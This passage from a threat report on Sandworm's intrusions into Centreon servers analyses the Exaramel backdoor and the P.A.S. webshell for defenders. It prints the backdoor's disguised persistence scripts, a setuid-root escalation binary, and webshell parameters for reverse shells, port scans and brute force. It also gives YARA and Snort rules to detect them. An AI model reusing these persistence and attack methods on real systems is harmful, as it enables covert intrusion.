respond either directly with the file in the response body, or with a JSON formated\n```\n  RespError structure.\n\n```\n27/01/2021 Page 17 of 38\n\n\n-----\n\nSandworm intrusion set campaign targeting Centreon systems\n\n_Get Interval_\n\nIn order to get from the Command and Control server the time interval during which it is supposed to suspend its\nexecution between two main loop runs, Exaramel executes a GET to $SERVER_URL/time.get/$EXARAMEL_GUID.\n\nThe server is expected to respond either with a Intervals or with a RespError structure, both in JSON.\n\n1 `type Intervals struct{`\n\n2 `Response struct {`\n\n3 `// Not used`\n\n4 `ID string `json:\"id\"``\n\n5 `// This field used role is unknown`\n\n6 `Timeout string `json:\"online_period\"``\n\n7 `// Two timestamps using the format \"15:04:05\" separated with a whitespace`\n\n8 `PermHours string `json:\"online_interval\"``\n\n9 `// Day(s) of the week, crontab syntaxe`\n\n10 `PermDays string `json:\"online_days_of_week\"``\n\n11 `// Day(s) of the month, crontab syntaxe`\n\n12 `PermNumberDays string `json:\"online_days\"``\n\n13 `// Month, crontab syntaxe`\n\n14 `PermMonths string `json:\"online_months\"``\n\n15 `} `json:\"response\"``\n\n16 `}`\n\nMost of the fields of the Intervals structure are parts of a crontab expression. The cron package mentioned before\nis used to analyse this structure’s fields in order to set the date of the next communication rendez-vous.\n\n_Commentary: It is the only use of the cron package. It is not used by persistence methods._\n\n_Send Next Time_\n\nAfter resolving the date at which it has to contact the Command and Control server, Exaramel sends it to the server.\n**Exaramel runs a POST request to $SERVER_URL/time.set. The following information is sent (percent-encoded) in**\nthe body of the POST request.\n\n    - guid: $EXARAMEL_GUID.\n\n    - next_connection: time span in seconds during which Exaramel will suspend its execution (configuration\nfield Next).\n\nThe server answers with either a NextTime or a RespError structure, both in JSON.\n\n1 `type NextTime struct{`\n\n2 `Response struct {`\n\n3 `ID string `json:\"id\"``\n\n4 `Status int `json:\"status\"``\n\n5 `} `json:\"response\"``\n\n6 `}`\n\nThe server’s response is ignored by Exaramel.\n\n_Commentary: It can be noted that Exaramel authors probably mistook the proxy URL (Proxy configuration field) with_\n_the server URL in this request. The server URL is used instead of the proxy URL. The Command and Control server might_\n_never receive this request._\n\n###### 2.2.2.8 Persistence\n\nWhen Exaramel starts, it checks if its persistence is active. If this is not the case, it scans its running environment\n(running privileges and startup system) and tries to persist. The persistence is deleted when Exaramel self-deletes.\nSeveral methods are used depending on the running environment. Theys are listed below.\n\n27/01/2021 Page 18 of 38\n\n\n-----\n\nSandworm intrusion set campaign targeting Centreon systems\n\n**_Exaramel is not run by root_**\n\n    - Installation: Exaramel adds two entries to the user crontab, one that restarts Exaramel every minute (*/1 *\n```\n    * * * ) and another one that starts Exaramel at the system start (@reboot).\n\n```\n    - Deletion: Exaramel deletes every entries of the user’s crontab.\n\n    - Check: Exaramel searches for $EXARAMEL_PATH in the crontab entries of the user.\n\n_Commentary: This persistence method is the only one that was seen by ANSSI during this campaign._\n\n**_Exaramel is run by root and the startup system is systemd_**\n\n    - Installation: Exaramel creates the file /etc/systemd/system/syslogd.service, enables the new unit\n(systemctl enable syslogd.service) and reloads the `systemd manager` configuration\n(systemctl daemon-reload). At this time, the new unit is not active. It means that if Exaramel stops, it\nwill not be restarted until the next time system reboot.\n\n    - Deletion: Exaramel disables the unit (systemctl disable syslogd.service) then deletes the file /etc/\n`systemd/system/syslogd.service,` reloads several time the `systemd manager` daemon\n(systemctl daemon-reload) and stops the unit (systemctl stop syslogd.service). Every crontab entries\nof the root user are also deleted.\n\n    - Check: Exaramel tests if the file /etc/systemd/system/syslogd.service exists.\n\nThe content of the file /etc/systemd/system/syslogd.service is given below.\n\n1 `[Unit]`\n\n2 `Description=Syslog daemon`\n\n3\n\n4 `[Service]`\n\n5 `WorkingDirectory=$EXARAMEL_DIR`\n\n6 `ExecStartPre=/bin/rm -f /tmp/.applocktx`\n\n7 `ExecStart=$EXARAMEL_PATH`\n\n8 `Restart=always`\n\n9\n\n10 `[Install]`\n\n11 `WantedBy=multi-user.target`\n\n**_Exaramel is run by root and the startup system is upstart_**\n\n    - Installation: Exaramel creates the file /etc/init/syslogd.conf.\n\n    - Deletion: Exaramel deletes the file /etc/init/syslogd.conf and runs the shell command stop syslogd.\nEvery crontab entries of the root user are also deleted.\n\n    - Check: Exaramel checks if the file /etc/init/syslogd.conf exists.\n\nThe content of the file /etc/init/syslogd.conf is given below.\n\n1 `start on runlevel [2345]`\n\n2 `stop on runlevel [06]`\n\n3\n\n4 `respawn`\n\n5\n\n6 `script`\n\n7 `rm -f /tmp/.applocktx`\n\n8 `chdir $EXARAMEL_DIR`\n\n9 `exec $EXARAMEL_PATH`\n\n10 `end script`\n\n27/01/2021 Page 19 of 38\n\n\n-----\n\nSandworm intrusion set campaign targeting Centreon systems\n\n**_Exaramel is run by root and the startup system is SystemV_**\n\n    - Installation: Exaramel creates the file /etc/init.d/syslogd and runs the commands update-rc.d syslogd\n```\n    defaults and update-rc.d syslogd enable.\n\n```\n    - Deletion: Exaramel deletes the file /etc/init.d/syslogd and runs the commands update-rc.d -f syslogd\n```\n    remove and update-rc.d syslogd disable. Every crontab entries of the root user are also deleted.\n\n```\n    - Check: Exaramel checks if the file /etc/init.d/syslogd exists.\n\nThe content of the file /etc/init.d/syslogd is given below.\n\n1 `#!/bin/sh`\n\n2 `### BEGIN INIT INFO`\n\n3 `# Provides:` `syslogd`\n\n4 `# Required-Start: $network $local_fs`\n\n5 `# Required-Stop:`\n\n6 `# Default-Start:` `2 3 4 5`\n\n7 `# Default-Stop:` `0 1 6`\n\n8 `# Short-Description: Syslog service for monitoring`\n\n9 `### END INIT INFO`\n\n10\n\n11 `rm -f /tmp/.applocktx && cd $EXARAMEL_DIR && exec $EXARAMEL_PATH &`\n\n**_Exaramel is run by root and the startup system is FreeBSD rc_**\n\n    - Installation: there is no specific installation method for this startup system. By default, the first installation\nmethod based on crontab is used (first described method). However it is possible that the intrusion set uses a\nsecond persistence methods specific to FreeBSD rc. However it is not implemented in EXARAMEL.\n\n    - Deletion: Exaramel deletes the file /etc/rc.d/syslogger/ as well as all lines of /etc/rc.conf that contains\n```\n    syslogger_enable. Every crontab entries of the root user are also deleted.\n\n```\n    - Check: Exaramel checks if the file /etc/rc.d/syslogger exists.\n\nThe content of the file /etc/rc.d/syslogger is not known.\n\n**_Exaramel is run by root but the startup system is not known_**\n\nThe persistence method based on crontab (first described method) is used by default.\n\n##### 2.2.3 Backdoor versions\n\nBefore march 2018, ANSSI identified the existence of an unencrypted configuration file named config.json at the\nsame time of a socket file /tmp/.applock. However, the file /tmp/.applock was also found subsequently to the\npresence of the file /tmp/.applocktx. At least three versions seem to exists:\n\nVersion Activity Persistence Configuration file encryption Configuration file encryption Socket\n\n1 11/2017 - 02/2018 respawner.sh and cron non config.json /tmp/.applock\n\n2 (ESET) 04/2018 cron yes config.json ?\n\n3 03/2018 - 05/2020 cron yes configtx.json /tmp/.applocktx\n\n_Commentary: Even if this version timeline is not entirely coherent, it does suggest several evolutions of the backdoor,_\n_including during the intrusion._\n\n27/01/2021 Page 20 of 38\n\n|Version|Activity|Persistence|Configuration file encryption|Configuration file encryption|Socket|\n|---|---|---|---|---|---|\n|1|11/2017 - 02/2018|respawner.sh and cron|non|config.json|/tmp/.applock|\n|2 (ESET)|04/2018|cron|yes|config.json|?|\n|3|03/2018 - 05/2020|cron|yes|configtx.json|/tmp/.applocktx|\n\n\n-----\n\nSandworm intrusion set campaign targeting Centreon systems\n#### 2.3 \"SetUID\" binary\n\nAn additional binary was identified with SetUID functionnalities on the path /bin/backup. It offers the execution\nof a list of commands with high privileges. The decompiled code is noted below.\n\n1 `int __cdecl main(int argc, const char **argv, const char **envp){`\n\n2 `setuid(0) ;`\n\n3 `system(\"/usr/share/centreon/www/include/tools/check.sh\");`\n\n4 `return 0;`\n\n5 `}`\n\nThis binary runs the content of the check.sh file as the system root user. This file can be edited by the user apache.\n\n### 3 Infrastructure\n\nANSSI’s investigation identified two infrastructure clusters used by the intrusion set.\n\n    - Anonymisation: the intrusion set uses common VPN services in order to connect to webshells;\n\n    - Command and Control: the intrusion set uses a separate set of servers to manage C2 communications with\nthe malwares.\n\n#### 3.1 Anonymisation infrastructure\n\nMost of the IP adresses that connected to the webshells belonged to following public or commercial anonymisation\nservices:\n\n    - TOR network;\n\n   - PRIVATEINTERNETACCESS (VPN) network;\n\n   - EXPRESSVPN network;\n\n   - VPNBOOK network.\n\nOther IP adresses could not be linked to public or commercial anonymisation infrastructure.\n\n#### 3.2 Command and Control infrastructure\n\n**Exaramel Command and Control servers are directly contacted by the malware through their IP adresses on the**\nport 443 using the HTTPS protocol. They are most probably entirely controlled by the intrusion set.\n\n27/01/2021 Page 21 of 38\n\n\n-----\n\nSandworm intrusion set campaign targeting Centreon systems\n\n### 4 Technics, tactics and procedures\n\nThe campaign technics, tactics and procedures are listed below:\n\nPhase ATT&CK Number Name Commentary\n\nInitial Access T1190 Exploit Public-Facing Application Uses Centreon UI\n\nPersistence T1505.003 Server Software Component - Web Shell Webshell P.A.S. 3.1.4\n\nPersistence T1503.003 Scheduled Task/Job: Cron Exaramel can use Cron\n\nPersistence T1503.004 Scheduled Task/Job: Launchd Exaramel can use Launchd\n\nPersistence T1543 Create or Modify System Process Exaramel can use Upstart\n\nPersistence T1543 Create or Modify System Process Exaramel can use SystemV\n\nPersistence T1543.002 Create or Modify System Process: Systemd Service Exaramel can use systemd\n\nPersistence T1543.004 Create or Modify System Process: Launch Daemon Service Exaramel can use systemd\n\nExecution T1059.004 Command and Scripting Interpreter - Unix Shell Linux shell use\n\nPrivilege Escalation T1548.001 Abuse Elevation Control Mechanism - Setuid and Setgid SetUID binary\n\nDefense Evasion T1140 Deobfuscate/Decode Files or Information P.A.S. 3.1.4 encryption\n\nDefense Evasion T1140 Deobfuscate/Decode Files or Information Exaramel - RC4 encryption of the configuration file\n\nDiscovery T1083 File and Directory Discovery Folder parsing\n\nCommand and Control T1573 Encrypted Channel Exaramel - HTTPS communications\n\nCommand and Control T1071.001 Application Layer Protocol: Web Protocols Exaramel - HTTPS communications\n\nExfiltration T1041 Exfiltration over C2 Channel Exaramel - HTTPS exfiltrations\n\n### 5 Links with the intrusion set Sandworm\n\n_Commentary: An intrusion set is the sum of tools, tactics, technics, procedures and characteristics used by one or more_\n_actors within one or more campaigns. It should not be confused with a threat actor which consists in peoples or organi-_\n_sations._\n\nThe webshell P.A.S. was freely available on the developer’s website. As such, it was accessible to multiple threat\nactors. Taken independantly, it is not an indicator that allows a link to an intrusion set.\n\n**Linux/Exaramel has already been analysed by ESET. They noted the similarities between this backdoor and In-**\n**dustroyer that was used by the intrusion set TeleBots, also known as Sandworm [1]. Even if this tool can be easily**\nreused, the Command and Control infrastructure was known by ANSSI to be controlled by the intrusion set.\n\nGenerally speaking, the intrusion set Sandworm is known to lead consequent intrusion campaigns before focusing\non specific targets that fits its strategic interests within the victims pool. The campaign observed by ANSSI fits this\nbehaviour.\n\n27/01/2021 Page 22 of 38\n\n|Phase|ATT&CK Number|Name|Commentary|\n|---|---|---|---|\n|Initial Access|T1190|Exploit Public-Facing Application|Uses Centreon UI|\n|Persistence|T1505.003|Server Sofwt are Component - Web Shell|Webshell P.A.S. 3.1.4|\n|Persistence|T1503.003|Scheduled Task/Job: Cron|Exaramel can use Cron|\n|Persistence|T1503.004|Scheduled Task/Job: Launchd|Exaramel can use Launchd|\n|Persistence|T1543|Create or Modify System Process|Exaramel can use Upstart|\n|Persistence|T1543|Create or Modify System Process|Exaramel can use SystemV|\n|Persistence|T1543.002|Create or Modify System Process: Systemd Service|Exaramel can use systemd|\n|Persistence|T1543.004|Create or Modify System Process: Launch Daemon Service|Exaramel can use systemd|\n|Execution|T1059.004|Command and Scripting Interpreter - Unix Shell|Linux shell use|\n|Privilege Escalation|T1548.001|Abuse Elevation Control Mechanism - Setuid and Setgid|SetUID binary|\n|Defense Evasion|T1140|Deobfuscate/Decode Files or Information|P.A.S. 3.1.4 encryption|\n|Defense Evasion|T1140|Deobfuscate/Decode Files or Information|Exaramel - RC4 encryption of the configuration file|\n|Discovery|T1083|File and Directory Discovery|Folder parsing|\n|Command and Control|T1573|Encrypted Channel|Exaramel - HTTPS communications|\n|Command and Control|T1071.001|Application Layer Protocol: Web Protocols|Exaramel - HTTPS communications|\n|Exfiltration|T1041|Exfiltration over C2 Channel|Exaramel - HTTPS exfiltrations|\n\n\n-----\n\nSandworm intrusion set campaign targeting Centreon systems\n\n### 6 Recommandations\n\n#### 6.1 Patch applications\n\nApplications vulnerabilities are often corrected by the editors. It is therefore recommanded to update applications\nas soon as vulnerabilities are public and corrective patches are issued. This is especially imperative for critical\nsystems such as monitoring systems.\n\n#### 6.2 Limit monitoring systems external exposure\n\nMonitoring systems such as Centreon need to be highly intertwined with the monitored information system and\ntherefore are a prime target for intrusion sets seeking lateralisation. It is recommanded either not to expose these\ntools’ web interfaces [10] to Internet or to restrict such access using non-applicative authentication (TLS client certificate, basic authentication on the web server).\n\n#### 6.3 Server hardening\n\nIf a monitoring systems is exposed, it is recommended to harden the Linux server hosting these tools using the\n**Renforcé profile of the guide RECOMMANDATIONS DE CONFIGURATION D’UN SYSTÈME GNU/LINUX [11].**\n\nIt is also recommended to export web server logs and to store them for at least one year.\n\n27/01/2021 Page 23 of 38\n\n\n-----\n\nSandworm intrusion set campaign targeting Centreon systems\n\n### 7 Detection methods\n\n_Commentary: Yara rules are also available in the attached file._\n\n#### 7.1 P.A.S. webshell detection\n\n##### 7.1.1 YARA rules\n\nThis first yara rule was designed to identify a file containing the webshell P.A.S.. It is based on a public rule written\nin 2016 by US-CERT in the document JAR-16-20296A [12] within Grizzly Steppe reports. It was slightly modified to\naccount for different character chains or file size limits.\n\nCode Source 7.1: P.A.S. webshell detection\n\n1 `rule PAS_webshell {`\n\n2\n\n3 `meta:`\n\n4 `author = \"FR/ANSSI/SDO\"`\n\n5 `description = \"Detects P.A.S. PHP webshell - Based on DHS/FBI JAR-16-2029 (Grizzly`\n_�→_ `Steppe)\"`\n\n6 `TLP = \"White\"`\n\n7\n\n8 `strings:`\n\n9\n\n10 `$php = \"<?php\"`\n\n11 `$base64decode = /='base'\\.\\(\\d+(\\*|\\/)\\d+\\)\\.'_de'\\.'code'/`\n\n12 `$strreplace = \"(str_replace(\"`\n\n13 `$md5 = \".substr(md5(strrev($\" nocase`\n\n14 `$gzinflate = \"gzinflate\"`\n\n15 `$cookie = \"_COOKIE\"`\n\n16 `$isset = \"isset\"`\n\n17\n\n18 `condition:`\n\n19\n\n20 `(filesize > 20KB and filesize < 200KB) and`\n\n21 `#cookie == 2 and`\n\n22 `#isset == 3 and`\n\n23 `all of them`\n\n24 `}`\n\n27/01/2021 Page 24 of 38\n\n\n-----\n\nSandworm intrusion set campaign targeting Centreon systems\nCode Source 7.2: Detection of Zip archives created by P.A.S.\n\n1 `rule PAS_webshell_ZIPArchiveFile {`\n\n2\n\n3 `meta:`\n\n4 `author = \"FR/ANSSI/SDO\"`\n\n5 `description = \"Detects an archive file created by P.A.S. for download operation\"`\n\n6 `TLP = \"White\"`\n\n7\n\n8 `strings:`\n\n9 `$ = /Archive created by P\\.A\\.S\\. v.{1,30}\\nHost: : .{1,200}\\nDate :`\n_�→_ `[0-9]{1,2}-[0-9]{1,2}-[0-9]{4}/`\n\n10\n\n11 `condition:`\n\n12 `all of them`\n\n13 `}`\n\nCode Source 7.3: Detection of PERL network scripts created by P.A.S.\n\n1 `rule PAS_webshell_PerlNetworkScript {`\n\n2\n\n3 `meta:`\n\n4 `author = \"FR/ANSSI/SDO\"`\n\n5 `description = \"Detects PERL scripts created by P.A.S. webshell to supports network`\n_�→_ `functionnalities\"`\n\n6 `TLP = \"White\"`\n\n7\n\n8 `strings:`\n\n9 `$pl_start = \"#!/usr/bin/perl\\n$SIG{'CHLD'}='IGNORE'; use IO::Socket; use FileHandle;\"`\n\n10 `$pl_status = \"$o=\\\" [OK]\\\";$e=\\\"` `Error: \\\"\"`\n\n11 `$pl_socket = \"socket(SOCKET, PF_INET, SOCK_STREAM,$tcp) or die print \\\"$l$e$!$l\"`\n\n12\n\n13 `$msg1 = \"print \\\"$l` `OK! I\\\\'m successful connected.$l\\\"\"`\n\n14 `$msg2 = \"print \\\"$l` `OK! I\\\\'m accept connection.$l\\\"\"`\n\n15\n\n16 `condition:`\n\n17 `filesize < 6000 and`\n\n18 `($pl_start at 0 and all of ($pl*)) or`\n\n19 `any of ($msg*)`\n\n20 `}`\n\n27/01/2021 Page 25 of 38\n\n\n-----\n\nSandworm intrusion set campaign targeting Centreon systems\nCode Source 7.4: Detection of SQL files created by P.A.S.\n\n1 `rule PAS_webshell_SQLDumpFile {`\n\n2\n\n3 `meta:`\n\n4 `author = \"FR/ANSSI/SDO\"`\n\n5 `description = \"Detects SQL dump file created by P.A.S. webshell\"`\n\n6 `TLP = \"White\"`\n\n7\n\n8 `strings:`\n\n9 `$ = \"-- [` `SQL Dump created by P.A.S.` `] --\"`\n\n10\n\n11 `condition:`\n\n12 `all of them`\n\n13 `}`\n\n##### 7.1.2 Network detection\n\nThe URL allowing to connect to the webshell is http://<IP>/centreon/search.php. It is not a classic\n**Centreon URL path. Valid connections to this URL can be considered malicious.**\n\n###### 7.1.2.1 Specific value used for password detection\n\nAs detailed in the webshell decryption analysis, each request to the webshell needs to transfer the password, either\nthrough a cookie if the user was already logged in, or through the login form. It is possible to detect a characteristic\nfield used to transfer the password, as suggested by the following Snort rules.\n\n1 `alert tcp any any -> any any ( sid:2000211001; msg:\"P.A.S. webshell - Password cookie\"; \\`\n\n2 `flow:established; content:\"g__g_=\"; http_cookie; offset:0; )`\n\n3\n\n4 `alert tcp any any -> any any ( sid:2000211002; msg:\"P.A.S. webshell - Password form var\"; \\`\n\n5 `flow:to_server,established; content:\"POST\"; http_method; \\`\n\n6 `content:\"g__g_=\"; http_cookie; http_client_body; offset:0; )`\n\n###### 7.1.2.2 POST request parameters for forms\n```\n  Explorer webshell operations\n\n```\nThe different operations allowed by the Explorer menu and the combination of POST parameters used by its forms\nare summarised in the table 7.2.\n\n27/01/2021 Page 26 of 38\n\n\n-----\n\nSandworm intrusion set campaign targeting Centreon systems\n\nParameter Example\n```\n         fe fe=&fdw=%2Fine%2Fjjj%2Fugzy%2Fjrofuryy%2Fgrfg\n         fdw\n         fe fe=&fcf=%2Fine%2Fjjj%2Fugzy%2Fjrofuryy%2Fgrfg\n         fcf\n         fe fe=&fm=%2Fine%2Fjjj%2Fugzy%2Fjrofuryy%2Fgrfg\n         fm\n         fe fe=&fd=%2Fine%2Fjjj%2Fugzy%2Fjrofuryy%2Fgrfg\n         fd\n copy or a move) fe fe=&fbp=Paste\n         fbp\n         fe fe=&fc%5B%5D=%2Fine%2Fjjj%2Fugzy%2Fjrofuryy%2Fgrfg&\n         fc fdwa=Download\n         fdwa\n         fe fe=&fc%5B%5D=%2Fine%2Fjjj%2Fugzy%2Fjrofuryy\n         fc %2Fgrfg_qve%2Fgrfg2&fc%5B%5D=%2Fine%2Fjjj\n         fca %2Fugzy%2Fjrofuryy%2Fgrfg_qve%2Fgrfg3.cf1&fca=C\n         fe fe=&fc%5B%5D=%2Fine%2Fjjj%2Fugzy%2Fjrofuryy\n         fc %2Fgrfg_qve%2Fgrfg2&fc%5B%5D=%2Fine%2Fjjj\n         fma %2Fugzy%2Fjrofuryy%2Fgrfg_qve%2Fgrfg3.cf1&fma=M\n         fe fe=&fc%5B%5D=%2Fine%2Fjjj%2Fugzy%2Fjrofuryy%2Fgrfg&\n         fc fda=Delete\n         fda\n\n```\nTable 7.1: POST parameters associated with Explorer menu operations\n\n|Operation|Parameter|Example|\n|---|---|---|\n|Get (unique file)|fe fdw|fe=&fdw=%2Fine%2Fjjj%2Fugzy%2Fjrofuryy%2Fgrfg|\n|Copy (unique file)|fe fcf|fe=&fcf=%2Fine%2Fjjj%2Fugzy%2Fjrofuryy%2Fgrfg|\n|Move (unique file)|fe fm|fe=&fm=%2Fine%2Fjjj%2Fugzy%2Fjrofuryy%2Fgrfg|\n|Del (unique file)|fe fd|fe=&fd=%2Fine%2Fjjj%2Fugzy%2Fjrofuryy%2Fgrfg|\n|Paste (following a copy or a move)|fe fbp|fe=&fbp=Paste|\n|Download (multiple files)|fe fc fdwa|fe=&fc%5B%5D=%2Fine%2Fjjj%2Fugzy%2Fjrofuryy%2Fgrfg& fdwa=Download|\n|Copy (multiple files)|fe fc fca|fe=&fc%5B%5D=%2Fine%2Fjjj%2Fugzy%2Fjrofuryy %2Fgrfg_qve%2Fgrfg2&fc%5B%5D=%2Fine%2Fjjj %2Fugzy%2Fjrofuryy%2Fgrfg_qve%2Fgrfg3.cf1&fca=Copy|\n|Move (multiple files)|fe fc fma|fe=&fc%5B%5D=%2Fine%2Fjjj%2Fugzy%2Fjrofuryy %2Fgrfg_qve%2Fgrfg2&fc%5B%5D=%2Fine%2Fjjj %2Fugzy%2Fjrofuryy%2Fgrfg_qve%2Fgrfg3.cf1&fma=Move|\n|Delete (multiple files)|fe fc fda|fe=&fc%5B%5D=%2Fine%2Fjjj%2Fugzy%2Fjrofuryy%2Fgrfg& fda=Delete|\n\n\nWhere:\n\n  - fe is File Explorer ;\n\n  - fdw is File Download ;\n\n  - fcf is File Copy File ;\n\n  - fm is File Move ;\n\n  - fd is File Delete ;\n\n\n\n- fc is File Collection ;\n\n- fdwa is File Download Action ;\n\n- fca is File Copy Action ;\n\n- fma is File Move Action ;\n\n- et fda is File Delete Action.\n\n\nThe following Snort rules allow to identify these parameters.\n\n1 `alert tcp any any -> any any ( sid:2000210001; msg:\"P.A.S. webshell - Explorer - download`\n_�→_ `file\"; \\`\n\n2 `flow:to_server,established; content:\"POST\"; http_method; \\`\n\n3 `content:\"fe=&fdw=%2F\"; http_client_body; offset:0)`\n\n4\n\n5 `alert tcp any any -> any any ( sid:2000210002; msg:\"P.A.S. webshell - Explorer - copy file\";`\n_�→_ `\\`\n\n6 `flow:to_server,established;` `content:\"POST\"; http_method; \\`\n\n7 `content:\"fe=&fcf=%2F\"; http_client_body; offset:0)`\n\n8\n\n9 `alert tcp any any -> any any ( sid:2000210003; msg:\"P.A.S. webshell - Explorer - move file\";`\n_�→_ `\\`\n\n10 `flow:to_server,established;` `content:\"POST\"; http_method; \\`\n\n11 `content:\"fe=&fm=%2F\"; http_client_body; offset:0)`\n\n12\n\n13 `alert tcp any any -> any any ( sid:2000210004; msg:\"P.A.S. webshell - Explorer - del file\"; \\`\n\n14 `flow:to_server,established;` `content:\"POST\"; http_method; \\`\n\n15 `content:\"fe=&fd=%2F\"; http_client_body; offset:0)`\n\n16\n\n17 `alert tcp any any -> any any ( sid:2000210005; msg:\"P.A.S. webshell - Explorer - multi file`\n_�→_ `download\"; \\`\n\n18 `flow:to_server,established;` `content:\"POST\"; http_method; \\`\n\n19 `content:\"fe=&fc%5B%5D=%2F\"; http_client_body; offset:0; \\`\n\n20 `content:\"&fdwa=Download\"; http_client_body; )`\n\n21\n\n27/01/2021 Page 27 of 38\n\n\n-----\n\nSandworm intrusion set campaign targeting Centreon systems\n\n22 `alert tcp any any -> any any ( sid:2000210006; msg:\"P.A.S. webshell - Explorer - multi file`\n_�→_ `copy\"; \\`\n\n23 `flow:to_server,established;` `content:\"POST\"; http_method; \\`\n\n24 `content:\"fe=&fc%5B%5D=%2F\"; http_client_body; offset:0; \\`\n\n25 `content:\"&fca=Copy\"; http_client_body;)`\n\n26\n\n27 `alert tcp any any -> any any ( sid:2000210007; msg:\"P.A.S. webshell - Explorer - multi file`\n_�→_ `move\"; \\`\n\n28 `flow:to_server,established;` `content:\"POST\"; http_method; \\`\n\n29 `content:\"fe=&fc%5B%5D=%2F\"; http_client_body; offset:0; \\`\n\n30 `content:\"&fma=Move\"; http_client_body; )`\n\n31\n\n32 `alert tcp any any -> any any ( sid:2000210008; msg:\"P.A.S. webshell - Explorer - multi file`\n_�→_ `delete\"; \\`\n\n33 `flow:to_server,established;` `content:\"POST\"; http_method; \\`\n\n34 `content:\"fe=&fc%5B%5D=%2F\"; http_client_body; offset:0; \\`\n\n35 `content:\"&fda=Delete\"; http_client_body; )`\n\n36\n\n37 `alert tcp any any -> any any ( sid:2000210009; msg:\"P.A.S. webshell - Explorer - paste\"; \\`\n\n38 `flow:to_server,established;` `content:\"POST\"; http_method; \\`\n\n39 `content:\"fe=&fbp=Paste\"; http_client_body; offset:0; )`\n\n40\n```\n  Searcher webshell operations\n\n```\nThe form used to search files on the compromised systems used the following parameters:\n\n    - fsr is the read/write status of (File Searcher Readable) ;\n\n    - fst is the searched type, file or folder (File Searcher Type) ;\n\n    - fsn is the searched file pattern (File Searcher Name) ;\n\n    - fsp is the path where the search should be run (File Searcher Path) ;\n\n    - fs is the generic identification of the menu (File Searcher) ;\n\n    - fss is the characters to identify within a file (File Searcher String).\n\nThe following Snort rules is a regular expression allowing to detect a communication with these parameters.\n\n1 `alert tcp any any -> any any ( sid:2000210010; msg:\"P.A.S. webshell - Searcher form`\n_�→_ `parameters\"; \\`\n\n2 `flow:to_server,established;` `content:\"POST\"; http_method; \\`\n\n3 `content:\"fe=&fsr=\"; offset:0; fast_pattern; \\`\n\n4 `pcre:\"/fe=&fsr=[0-2]&fst=[0-2]&fsn=(\\*|[A-Za-z0-9 *._%-]+)&fsp=[A-Za-z0-9`\n_�→_ `*._%-]+&fs=%3E&fss=.*/\";)`\n```\n  SQL Client webshell operations P.A.S.\n\n```\nThe form that allows to connect to the database takes the following inputs:\n\n    - sc[tp] is the database type (Sql Client Type), either mysql, mssql or pg ;\n\n    - sc[ha] is the SQL database host adress (Sql Client Host Address) ;\n\n    - sc[hp] is the connexion port (Sql Client Host Port) ;\n\n27/01/2021 Page 28 of 38\n\n\n-----\n\nSandworm intrusion set campaign targeting Centreon systems\n\n    - sc[un] is the database user (Sql Client User Name) ;\n\n    - sc[up] is the database password (Sql Client User Password) ;\n\n    - sc[db] is the targeted database (Sql Client Database) ;\n\n    - se is the generic submit identification of this form and defined as the character >.\n\nThe following Snort rule allows to detect a request with such parameters.\n\n1 `alert tcp any any -> any any ( sid:2000210011; msg:\"P.A.S. webshell - SQL-client connect`\n_�→_ `parameters\"; \\`\n\n2 `flow:to_server,established; content:\"POST\"; http_method; \\`\n\n3 `content:\"sc%5Btp%5D=\"; offset:0; http_client_body; fast_pattern; \\`\n\n4 `pcre:\"/sc%5Btp%5D=(mysql|mssql|pg)&sc%5Bha%5D=/\"; http_client_body;)`\n```\n  Network Tools webshell operations\n\n```\nThe different actions managed by the Network Tools menu are assiociated with the following parameters.\n\nOperation Parameters Example\n```\n             Bind port pb pb=8888&nt=bp\n             Back-connect hbc hbc=127.0.0.1&pbc=9999&nt=bc\n                     pbc\n             Port scanner hs hs=localhost&pf=0&pl=65535&sc=50&nt=ps\n                     pf\n                     pl\n                     sc\n\n```\nTable 7.2: POST parameters for Network Tools forms\n\nWhere:\n\n    - pb is the Bind Shell port (Port Bind);\n\n    - hbc is the Reverse Shell host (Host Back Connect);\n\n    - pbc is the Reverse Shell port (Port Back Connect);\n\n    - hs is the IP address to scan (Host Scanner);\n\n     - pf is the first port to scan (Port First);\n\n     - pl is the last port to scan (Port Last);\n\n    - and sc is the max parrallel connexion to run (Stream Count).\n\nThe following Snort rules are a suggestion to detect related communication.\n\n1 `alert tcp any any -> any any ( sid:2000210012; msg:\"P.A.S. webshell - Network Tools - Bind`\n_�→_ `Port\"; \\`\n\n2 `flow:to_server,established; content:\"POST\"; http_method; \\`\n\n3 `content:\"pb=\"; offset:0; http_client_body; \\`\n\n4 `pcre:\"/pb=[0-9]{1,5}&nt=bp/\"; )`\n\n5\n\n6 `alert tcp any any -> any any ( sid:2000210013; msg:\"P.A.S. webshell - Network Tools -`\n_�→_ `Back-connect\"; \\`\n\n7 `flow:to_server,established; content:\"POST\"; http_method; \\`\n\n8 `content:\"hbc=\"; offset:0; http_client_body; \\`\n\n9 `pcre:\"/hbc=[a-z0-9.-]{4,63}&pbc=[0-9]{1,5}&nt=bc/\"; )`\n\n10\n\n11 `alert tcp any any -> any any ( sid:2000210014; msg:\"P.A.S. webshell - Network Tools - Port`\n_�→_ `scanner\"; \\`\n\n27/01/2021 Page 29 of 38\n\n|Operation|Parameters|Example|\n|---|---|---|\n|Bind port|pb|pb=8888&nt=bp|\n|Back-connect|hbc pbc|hbc=127.0.0.1&pbc=9999&nt=bc|\n|Port scanner|hs pf pl sc|hs=localhost&pf=0&pl=65535&sc=50&nt=ps|\n\n\n-----\n\nSandworm intrusion set campaign targeting Centreon systems\n\n12 `flow:to_server,established; content:\"POST\"; http_method; \\`\n\n13 `content:\"hs=\"; offset:0; http_client_body; \\`\n\n14 `pcre:\"/hs=[a-z0-9.-]{4,63}&pf=[0-9]{1,5}&pl=[0-9]{1,5}&sc=[0-9]{1,5}&nt=ps/\"; )`\n```\n  Passwd BruteForce webshell operations\n\n```\nThe BruteForce attack form parameters are listed in the table 7.3.\n\nParametter Description Values\n`br` bruteforce tool N/A\n`brp[]=X` attacked protocol Where the protocol might be:\n_Bruteforce protocol[]=protocol_ `h (SSH)`\n```\n                                  f (FTP)\n                                  m (Mail)\n                                  y (MySQL)\n                                  s (MsSQL)\n                                  p (PostgreSQL)\n\n```\n`h[X]=val` attack target host[protocol]=target Where the protocol is chosen within the following list and the target is either a domain or an IP address.\n`p[X]=val` port[protocol]=targeted port Where the protocol is chosen within the following list or the port is a numerical value.\n`el` user/password couple root:root `on`\n`ep` user/password couple root:ftproot `on`\n`er` user/password couple root:toor `on`\n`es` user/password couple root:rootftp `on`\n\nTable 7.3: POST parameters for the brute force attack form\n\nThe following extract shows an example for this menu.\n\n|Parametter|Description|Values|\n|---|---|---|\n|br|bruteforce tool|N/A|\n|brp[]=X|attacked protocol Bruteforce 